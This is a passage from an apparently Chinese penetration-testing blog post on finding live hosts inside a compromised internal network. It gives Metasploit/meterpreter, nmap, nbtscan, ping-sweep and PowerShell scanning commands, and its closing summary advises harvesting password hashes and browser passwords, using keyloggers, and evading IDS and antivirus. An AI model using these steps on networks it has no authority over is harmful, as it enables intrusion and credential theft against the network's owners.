+<p>0x04 其它的一些arp扫描方法:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你直接就处在别人的vpn内网中,也可以选择用netdiscover(kali自带),指定那个vpn内网的网卡接口进行arp扫描即可,速度还行<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># netdiscover -r <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span> -i eth0</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp_netdis.png" alt="&#39;&#39;"></p>
+<p>使用msf内置的各种arp扫描模块,还是那句话,如果你目前已经直接处在对方的内网环境中,可以直接用下面的模块<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">msf &gt; use  auxiliary/scanner/discovery/arp_sweep</div><div class="line">msf &gt; show options</div><div class="line">msf &gt; <span class="builtin-name">set</span> <span class="built_in"> interface </span>eth0</div><div class="line">msf &gt; <span class="builtin-name">set</span>  smac 00:0c:29:92:fd:85</div><div class="line">msf &gt; <span class="builtin-name">set</span>  rhosts 192.168.3.0/24</div><div class="line">msf &gt; <span class="builtin-name">set</span>  threads 20</div><div class="line">msf &gt; <span class="builtin-name">set</span>  shost 192.168.3.28</div><div class="line">msf &gt; run</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp_msf.png" alt="&#39;&#39;"></p>
+<p>如果你只是拿到对方内网中的一个meterpreter,也可以用meterpreter中内置的arp扫描模块,不过在此之前,你可能还需要在中间先添加一条路由:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; getsystem 	另外,在目标机器上扫描时,务必先提权,纯属个人建议,会方便很多,不然扫描过程中可能会有些问题</div><div class="line">meterpreter &gt; run autoroute -s 192.168.244.0/24</div><div class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.3.0/24</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_arp_scan_msf_linux.jpg" alt="&#39;&#39;"><br><br><br><br>0x05 基于icmp的各种内网主机发现方式,如果防火墙过滤的icmp请求,这种方式基本就废了,不过如果是在域还是挺好使的:</p>
+<p>0x06 在win下进行各种icmp扫描:</p>
+<p>cmd中执行如下命令,对整个C段进行ping扫描<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># for /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192.168</span><span class="number">.3</span>.%I | findstr <span class="string">"TTL="</span> &gt;&gt; result.txt   扫描从<span class="number">1</span>到<span class="number">254</span>这么多台机器</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_dos_icmp.png" alt="&#39;&#39;"></p>
+<p>nmap中同样也提供了基于icmp的扫描方式,PE就是最普通的icmp echo request,另外,还有基于timestamp和netmask request discovery的icmp扫描方式<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nmap -sn -PE <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_win_nmap_connect.jpg" alt="&#39;&#39;"></p>
+<p>使用nping,在nmap程序包中一般也会自带,win下使用暂时还有些儿问题,工具也比较老了,不多说<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nping --icmp --icmp-type time <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span> | findstr <span class="string">"reply"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_dos_nping.png" alt="&#39;&#39;"></p>
+<p>利用powershell对目标内网进行icmp扫描<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">powershell</span><span class="selector-class">.exe</span> <span class="selector-tag">-exec</span> <span class="selector-tag">bypass</span> <span class="selector-tag">-Command</span> "<span class="selector-tag">Import-Module</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Invoke-TSPingSweep</span><span class="selector-class">.ps1</span>;<span class="selector-tag">Invoke-TSPingSweep</span> <span class="selector-tag">-StartAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.1</span> <span class="selector-tag">-EndAddress</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.254</span> <span class="selector-tag">-ResolveHost</span> <span class="selector-tag">-ScanPort</span> <span class="selector-tag">-Port</span> 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000"    目标网段,并非仅限<span class="selector-tag">C</span>段,比如你也可以写成这种方式192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.1</span> <span class="selector-tag">-</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.254</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_ethnet_arp_powershell1.png" alt="&#39;&#39;"></p>
+<p>0x07 在linux下使用各类icmp扫描:<br>最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/bin/bash</span></div><div class="line"><span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> 192.168.3.&#123;1<span class="built_in">..</span>254&#125; </div><div class="line"><span class="keyword">do</span> </div><div class="line">  <span class="built_in"> ping </span><span class="variable">$ip</span> -c 1 &amp;&gt; /dev/<span class="literal">null</span> </div><div class="line">   <span class="keyword">if</span> [ $? -eq 0 ];then </div><div class="line">	echo <span class="variable">$ip</span> is alive <span class="built_in">..</span><span class="built_in">..</span> </div><div class="line">   fi </div><div class="line">done</div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_ping_scan.jpg" alt="&#39;&#39;"></p>
+<p>同上,依然可以使用nmap的icmp扫描<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nmap -sn -PE <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_linux_nmap_connect.jpg" alt="&#39;&#39;"></p>
+<p>使用nping,用法依然是跟上面一致<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nping --icmp --icmp-type time <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span> | grep <span class="string">"reply"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_nping.jpg" alt="&#39;&#39;"><br><br></p>
+<p>0x07 基于smb和netbios的内网主机发现方式,这种方式通常在win内网中非常实用:<br>win下:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nbtscan.exe -m  <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span>   非常经典的小工具</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_nbtscan.png" alt="&#39;&#39;"></p>
+<p>linux下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar -zxvf nbtscan-source-1.0.35.tgz</span></div><div class="line"><span class="meta">#</span><span class="bash"> make</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./nbtscan -h</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./nbtscan -m 192.168.3.0/24</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_nbtscan_linux.jpg" alt="&#39;&#39;"></p>
+<p>其它的一些smb发现方式:</p>
+<p>通过已经弹回的meterpreter,在目标机器上添加路由之后,使用smb_version模块亦可实现同样的目的:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">/auxiliary/</span>scanner<span class="regexp">/smb/</span>smb_version</div></pre></td></tr></table></figure></p>
+<p><img src="/img/msf_smb_version_s.jpg" alt="&#39;&#39;"><br><br></p>
+<p>0x08 基于常规tcp/udp端口扫描的内网主机发现方式,还是那句话,如果防火墙或者其他防护系统阻隔了对某些端口方法,依然是个废:</p>
+<p>scanline tcp/udp端口扫描,非常经典的小工具,单文件,实际渗透中比较方便:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># sl -htz <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span><span class="number">-160</span>   默认不指定端口的情况下,会按它自己的高危来扫,至于扫哪些端口,请自行查看mcafee官网</div><div class="line"># sl -hz -t <span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span><span class="number">-89</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">143</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">1025</span>,<span class="number">1433</span>,<span class="number">1521</span>,<span class="number">2601</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">3690</span>,<span class="number">5432</span>,<span class="number">5900</span>,<span class="number">7001</span>,<span class="number">8000</span>,<span class="number">8080</span><span class="number">-8089</span>,<span class="number">9090</span>,<span class="number">10000</span> -u <span class="number">161</span> <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span><span class="number">-160</span> &gt;&gt; result.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_sl.png" alt="&#39;&#39;"></p>
+<p>nmap tcp/udp端口扫描:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nmap --script smb-enum-shares.nse -p445 <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span>  扫描可读写共享,能力非常有限,已经有很多更好的替代品</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_nmap_smbshares.png" alt="&#39;&#39;"></p>
+<p>superscan tcp/udp端口扫描:<br>纯图形化界面,使用非常简单,另外,它也可以专门用来枚举特定机器的信息,只是用于枚举的时候,不能直接指定网段,简直可惜<br><img src="/img/common_superscan.jpg" alt="&#39;&#39;"></p>
+<p>msf中也内置了各种各样的服务端口扫描模块,不过,你可能需要先提权然后添加路由才可以正常使用,当然,如果你直接处在对方内网中就不用了:<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msf &gt; <span class="keyword">use</span> auxiliary/scanner/portscan/*</div><div class="line">msf &gt; <span class="keyword">use</span> auxiliary/scanner/smb/*</div><div class="line">msf &gt; <span class="keyword">use</span> auxiliary/scanner/smtp/*</div><div class="line">msf &gt; <span class="keyword">use</span> auxiliary/scanner/snmp/*</div><div class="line">msf &gt; <span class="keyword">use</span> auxiliary/scanner/telnet/*</div><div class="line">……</div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_msf_portscan.jpg" alt="&#39;&#39;"></p>
+<p>另外,还有个非常不错的py小脚本F-NAScan,速度很快,在linux内网机器上会非常好用[前提是要对应版本的py环境才行]<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># python F-NAScan.py -h <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span><span class="number">-192.168</span><span class="number">.3</span><span class="number">.250</span> -p <span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">143</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">1025</span>,<span class="number">1433</span>,<span class="number">1521</span>,<span class="number">2601</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">3690</span>,<span class="number">5432</span>,<span class="number">5900</span>,<span class="number">7001</span>,<span class="number">8000</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span> -m <span class="number">30</span> -t <span class="number">5</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/common_f_nascan.jpg" alt="&#39;&#39;"><br><br></p>
+<p>0x09 如果你当前shell权限确实很有限或由于其它各种各样的原因导致我们暂时没法代理进内网,借助web脚本实现对内网进行窥探无疑是个非常好的方式:</p>
+<p>基于 aspx 的内网存活探测脚本:<br><img src="/img/web_commom_aspx.jpg" alt="&#39;&#39;"></p>
+<p>基于 php 的内网存活探测脚本:<br><img src="/img/web_commom_php.jpg" alt="&#39;&#39;"></p>
+<p>基于 jsp 的内网存活探测脚本:<br><img src="/img/web_commom_jsp.jpg" alt="&#39;&#39;"></p>
+<p>0x10 在域内环境下的主机发现方式,一般在域内,各种条件相对来说还是比较宽松的,因为大多数都可能是办公网:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> net view</span></div><div class="line"><span class="meta">#</span><span class="bash"> dsquery computer  其实,域内最好用的外部也就是nbtscan了</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/domain.jpg" alt="&#39;&#39;"></p>
+<p>0x11 基于snmp的内网信息搜集方式:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">待续……</div></pre></td></tr></table></figure></p>
+<p>0x12 最后,再介绍个好玩的ip流量监控小工具<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">iptraf</span></div></pre></td></tr></table></figure></p>
+<p>一个查端口对应的服务的小工具,有兴趣可自行尝试<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">whatportis</span></div></pre></td></tr></table></figure></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;所有的扫描,有条件的情况下务必都在管理员权限下运行,对于内网主机发现,个人平时大概用到的,基本也就这些了,只不过在实际扫的时候,记得线程给的不要太高,一次扫的端口不要过多,如果工具里面自带的有随机扫ip的选项,最好也把它加上,另外,在内网中,理论上来讲,你应该首先瞄准找一些能快速getshell的内网机器,比如,sa,smb,ftp<code>针对linux</code>,能读写的匿名共享等……严禁大规模漫无目的的扫描,当你拿到一台机器以后,马上上去把能抓的密码hash都抓一下,比如,浏览器中的各种密码,本机的hash,常用软件中的各种密码hash等等……,实在不行再上键盘记录,拿到这些密码以后再慢慢拓展其它机器,切记,尽量不要进行长时间大流量的扫描动作<code>基本上我们现在所用的工具报文标志早已被写进各类ids的识别规则里了,尤其是针对nmap的</code>,会在对方系统中留下大批的扫描日志不说,稍微严谨点儿的内网可能会触发报警,甚至直接锁定ip,内网不比web,在web中你也许可以相对放开点去搞,但内网中,务必小心谨慎,权限来之不易,绝对不能让它轻易的掉了,尽你所能的稳住当前机器,另外,在平时的内网渗透中,能用系统自身工具搞定的,尽量都用系统自带的工具来搞<code>其实,系统自己就已经有非常多的渗透工具,可能只是暂时还没有很好的被发掘出来</code>,这一点非常重要,大家从现在开始,也应该尽量养成自己这样的习惯,尽可能的减少使用一些外部工具,越少越好,安全性没法保障的同时,可能实际使用中也并不是很方便,灵活性就更不用说了,尤其在一些比较畸形的内网中,由于种种限制,从远程下工具还是比较困难的,另外,别人的工具很可能有相当一部分工具都是需要自己免杀的<code>单单基于汇编层免杀还是很有限的</code>,如果你不会免杀,这事儿就很麻烦了,毕竟不是源自自己的手,用别人的始终不太放心,所以,有些东西还是大家自己考量吧……这里只是一点个人建议而已,当然,如果你有喜欢逆别人工具的习惯,这里所说的一切,您都可以直接忽略,如果自己不会逆向,还是谨慎点儿好,如果你想更仔细的去观察基于不同协议更底层的扫描细节,用wireshark吧,它绝对是我见过的最牛最实用的渗透工具,是的,没有之一,祝,愉快</p>
+
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="" href="/page/7/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/9/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
